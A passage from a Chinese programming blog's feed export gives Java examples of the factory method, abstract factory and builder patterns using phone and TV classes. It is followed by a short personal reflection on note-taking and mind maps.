<h2 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h2><h3 id="思维导图-3"><a href="#思维导图-3" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/CKNFh6" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote>
<p>主要是从简单工厂模式的一个工厂对应不同产品到工厂模式的不同工厂对应不同产品，来实现开闭原则。一旦有产品增加，可以通过增加工厂的方式来实现需求，不需要像简单工厂那样去修改原有的工厂代码。但简单工厂的代码修改可以限制在增加生产方法上面，其实也很好维护。</p>
</blockquote>
<blockquote>
<p>下面的代码通过不同的电视工厂来获取不同的电视产品，比如通过小米电视工厂获取小米电视，华为电视工厂获取华为电视，比简单工厂模式多了一个工厂接口，因此可以建立不同的工厂满足种类繁多的产品的创建，一类工厂满足一类产品。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TVFactroy MiF=<span class="keyword">new</span> MiTVFactory();</span><br><span class="line">        TV MiTv=MiF.getTV();</span><br><span class="line">        MiTv.Show();</span><br><span class="line"></span><br><span class="line">        TVFactroy HuaweiF=<span class="keyword">new</span> HuaweiTVFactory();</span><br><span class="line">        TV HuaweiTv=HuaweiF.getTV();</span><br><span class="line">        HuaweiTv.Show();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相较于简单工厂模式增加了一个工厂接口，通过扩展工厂类的方式代替修改工厂代码</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TVFactroy</span> </span>&#123;</span><br><span class="line">    <span class="function">TV <span class="title">getTV</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不同的产品对应不同的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiTVFactory</span> <span class="keyword">implements</span> <span class="title">TVFactroy</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TV <span class="title">getTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MiTV4s70();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiTVFactory</span> <span class="keyword">implements</span> <span class="title">TVFactroy</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TV <span class="title">getTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HuaweiTV65();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiTV4s70</span> <span class="keyword">implements</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am MiTV4s70&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiTV65</span> <span class="keyword">implements</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am HuaweiTV65&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><h3 id="思维导图-4"><a href="#思维导图-4" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/BeTDYu" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote>
<p>下面的代码通过建立小米族产品超级工厂和华为族产品超级工厂实现超级抽象工厂接口，这些超级工厂生产不同级产品。如通过抽象工厂接口 SuperFactory 操作小米工厂 MiFactory 的不同生产方法，如 getTV() 获取实现了抽象产品 TV 的实际产品 MiTV，用 getPhone() 获取实现了抽象产品 Phone 的实际产品 Mi11。不同工厂的同级产品，实现的抽象产品接口都是一样的。比如小米工厂生产的 Mi11 产品和华为工厂生产的 HUAWEIMate40Pro 产品同级，都是实现了抽象产品接口 Phone。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//展示消费者通过超级工厂获取产品的实例</span></span><br><span class="line">        System.out.println(<span class="string">&quot;I am a Mi-funs&quot;</span>);</span><br><span class="line">        SuperFactory Mi=<span class="keyword">new</span> MiFactory();</span><br><span class="line">        Phone MiPhone=Mi.getPhone();</span><br><span class="line">        TV MiTV=Mi.getTV();</span><br><span class="line">        MiPhone.call();</span><br><span class="line">        MiTV.watchTV();</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;I am a HUAWEI-funs&quot;</span>);</span><br><span class="line">        SuperFactory HUAWEI=<span class="keyword">new</span> HUAWEIFactory();</span><br><span class="line">        Phone HUAWEIPhone=HUAWEI.getPhone();</span><br><span class="line">        TV HUAWEITV=HUAWEI.getTV();</span><br><span class="line">        HUAWEIPhone.call();</span><br><span class="line">        HUAWEITV.watchTV();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义超级工厂的同族不同级的产品生产</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">SuperFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">Phone <span class="title">getPhone</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">TV <span class="title">getTV</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 小米工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiFactory</span> <span class="keyword">implements</span> <span class="title">SuperFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Phone <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Mi11();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TV <span class="title">getTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MiTV4s65();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 华为工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HUAWEIFactory</span> <span class="keyword">implements</span> <span class="title">SuperFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Phone <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HUAWEIMate40Pro();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TV <span class="title">getTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HAUWEIX70();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义手机产品统一功能</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义电视产品统一功能</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">watchTV</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体产品</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi11</span> <span class="keyword">implements</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am calling by Mi11&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HUAWEIMate40Pro</span> <span class="keyword">implements</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am calling by HUAWEIMate40Pro&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiTV4s65</span> <span class="keyword">implements</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">watchTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am watching MiTV4s65&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HAUWEIX70</span> <span class="keyword">implements</span>  <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">watchTV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am watching HUAWEIX70!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><h3 id="思维导图-5"><a href="#思维导图-5" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/trTwtE" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote>
<p>下面代码通过将一个复杂产品（手机）的建造交给不同的建造者（小米建造、华为建造）得到不同的产品（小米手机，华为手机），而选择建造者的指挥建造者的是手机生产的流水线（指挥者），选择小米建造者生产小米手机，同理获得华为手机。</p>
</blockquote>
<ul>
<li><p>消费者 Foxconn：告诉指挥者（流水线）ConstructStream 需要什么手机，然后等待流水线返回手机 Phone 的实例。</p>
</li>
<li><p>指挥者 ConstructStream：根据消费者的需求（传入的手机名称），选择合适的建造者（创建对应实例 MiBuilder HUAWEIBuilder），然后指挥建造者去做自己可以完成的每一道工序（installCPU()…），完成所有步骤之后，让建造者返回手机给自己（getPhone()）。</p>
</li>
<li><p>建造者 Builder：实现了建造手机的所有步骤，不同的建造者用于建造不同的手机，MiBuilder 只能完成 Mi11 的建造。</p>
</li>
<li><p>手机 Phone：单个产品，创建非常复杂，有很多初始化参数，所以交给流水线处理。</p>
</li>
</ul>
<p>建造者关心的是如何一步一步建造 <strong>一个</strong> 比较复杂的产品（通过建造者完成大量步骤获取产品），而工厂方法关心的是以怎样的方式获取一类产品（比如通过超级工厂获取不同级产品）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> space.xorex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Foxconn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 来富士康拿手机</span></span><br><span class="line">        ConstructStream ConMiPhone=<span class="keyword">new</span> ConstructStream(<span class="string">&quot;Mi11&quot;</span>);</span><br><span class="line">        Phone Mi=ConMiPhone.StartConstruct();</span><br><span class="line">        ConstructStream ConHUAWEIPhone=<span class="keyword">new</span> ConstructStream(<span class="string">&quot;HUAWEIMate40Pro&quot;</span>);</span><br><span class="line">        Phone HUAWEI=ConHUAWEIPhone.StartConstruct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指挥手机生产的流水线（指挥者 Director）,从这里获取手机实例</span></span><br><span class="line"><span class="comment">// 不需要关心如何指挥手机的具体建造者，让流水线（指挥者）管理</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConstructStream</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String PhoneName;</span><br><span class="line">    <span class="keyword">private</span> Builder worker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstructStream</span><span class="params">(String phoneName)</span> </span>&#123;</span><br><span class="line">        PhoneName = phoneName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Phone <span class="title">StartConstruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(PhoneName==<span class="string">&quot;Mi11&quot;</span>) worker=<span class="keyword">new</span> MiBuilder(PhoneName);</span><br><span class="line">        <span class="keyword">if</span>(PhoneName==<span class="string">&quot;HUAWEIMate40Pro&quot;</span>) worker=<span class="keyword">new</span> HUAWEIBuilder(PhoneName);</span><br><span class="line"></span><br><span class="line">        worker.installCPU();</span><br><span class="line">        worker.installGPU();</span><br><span class="line">        worker.installRAM();</span><br><span class="line">        worker.installROM();</span><br><span class="line">        worker.installScreen();</span><br><span class="line">        worker.installBattery();</span><br><span class="line">        worker.installCamera();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> worker.getPhone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象建造者，定义建造者需要执行的步骤</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installCPU</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installGPU</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installRAM</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installROM</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installScreen</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installBattery</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">installCamera</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Phone <span class="title">getPhone</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现的具体建造者，不同建造者获取的产品不同</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiBuilder</span> <span class="keyword">implements</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Phone phone=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    MiBuilder(String PhoneName) &#123;</span><br><span class="line">        phone=<span class="keyword">new</span> Phone(PhoneName);</span><br><span class="line">        System.out.println(PhoneName+<span class="string">&quot; start making!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCPU</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installCPU(<span class="string">&quot;SnapDragon 888&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Installed CPU : SnapDragon 888&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installGPU</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installGPU(<span class="string">&quot;Adreno 660&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install GPU : Adreno 660&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installRAM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installRAM(<span class="string">&quot;LPDDR5&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install RAM : LPDDR5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installROM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installROM(<span class="string">&quot;UFS 3.1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install ROM : UFS 3.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installScreen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installScreen(<span class="string">&quot;OLED2k120HZ&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Screen : OLED2k120HZ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installBattery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installBettary(<span class="string">&quot;4600mah&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Battery : 4600mah&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCamera</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installCarame(<span class="string">&quot;HMX&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Camera : HMX&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Phone <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mi11 made Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现的具体建造者，不同建造者获取的产品不同</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HUAWEIBuilder</span> <span class="keyword">implements</span> <span class="title">Builder</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Phone phone=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    HUAWEIBuilder(String PhoneName) &#123;</span><br><span class="line">        <span class="keyword">this</span>.phone = <span class="keyword">new</span> Phone(PhoneName);</span><br><span class="line">        System.out.println(PhoneName+<span class="string">&quot; start making!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCPU</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installCPU(<span class="string">&quot;Kirin9000&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install CPU Kirin9000&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installGPU</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installGPU(<span class="string">&quot;Mali-G78&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install GPU : Mali-G78&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installRAM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installRAM(<span class="string">&quot;LPDDR5&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install RAM : LPDDR5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installROM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installROM(<span class="string">&quot;UFS3.1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install ROM : UFS3.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installScreen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installScreen(<span class="string">&quot;OLED1080P90HZ&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Screen : OLED1080P90HZ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installBattery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installBettary(<span class="string">&quot;4400mah&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Battery : 4400mah&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCamera</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        phone.installCarame(<span class="string">&quot;IMX700&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Install Camera : IMX700&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Phone <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HUAWEIMate40Pro made Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要获取的产品实例（流水线指挥不同的建造者生产不同的手机）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String Name=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String CPU=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String GPU=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String RAM=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String ROM=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String Screen=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String Bettary=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String Carame=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCPU</span><span class="params">(String CPU)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.CPU = CPU;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installGPU</span><span class="params">(String GPU)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.GPU = GPU;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installRAM</span><span class="params">(String RAM)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.RAM = RAM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installROM</span><span class="params">(String ROM)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ROM = ROM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installScreen</span><span class="params">(String screen)</span> </span>&#123;</span><br><span class="line">        Screen = screen;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installBettary</span><span class="params">(String bettary)</span> </span>&#123;</span><br><span class="line">        Bettary = bettary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installCarame</span><span class="params">(String carame)</span> </span>&#123;</span><br><span class="line">        Carame = carame;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>创建型</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记计划2.0</title>
    <url>/2021/03/09/f0796de4869b/</url>
    <content><![CDATA[<h2 id="关于笔记记录的一点思考"><a href="#关于笔记记录的一点思考" class="headerlink" title="关于笔记记录的一点思考"></a>关于笔记记录的一点思考</h2><p>今天在记录创建型模式的时候发现这种需要大段文字描述的知识点并不适合使用思维导图，所以后面讲解设计模式具体的案例的时候，会重新回归笔记的方式，emmmm，或者说是，笔记+思维导图。</p>
<p>自己以前好像一直在滥用思维导图，现在想想思维导图应该是为了帮助自己更加清晰的梳理关系，归纳知识点，而不是一味的将所有的学习内容都用思维导图罗列表示出来。</p>
<p>所以应该两者一起使用，并再多学习一些 XMind 的模板，主要将思维导图作为关系展示图。而对于详细某些知识点的理解，应该还是要用文字和代码一起说明。</p>
<p>新的笔记应该聚焦于一些核心知识点的记录，而不是用来引导萌新的新手教程，尽可能写的简练而又全面。笔记的目的是为了自己以后遗忘了某块知识，需要查阅的时候，可以快速定位并快速提取出来需要的信息。</p>
<p>目前的打算是，对于一个全新的知识点，首先有一个概览笔记，主要是梳理所有内容的联系和一些基本名词的解释，然后再用若干篇小文章来分别阐述不同的具体知识。而对于一些类的方法的列出，或者命令的集合，还是使用思维导图比较合适归纳。</p>
]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>思维导图</tag>
        <tag>笔记</tag>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式原则思维导图</title>
    <url>/2021/03/09/ebff1b4e77e7/</url>
    <content><![CDATA[<h2 id="设计模式原则"><a href="#设计模式原则" class="headerlink" title="设计模式原则"></a>设计模式原则</h2><p>一句话概括：</p>
<table>
<thead>
<tr>
<th>设计原则</th>
<th>一句话归纳</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td>开闭原则</td>
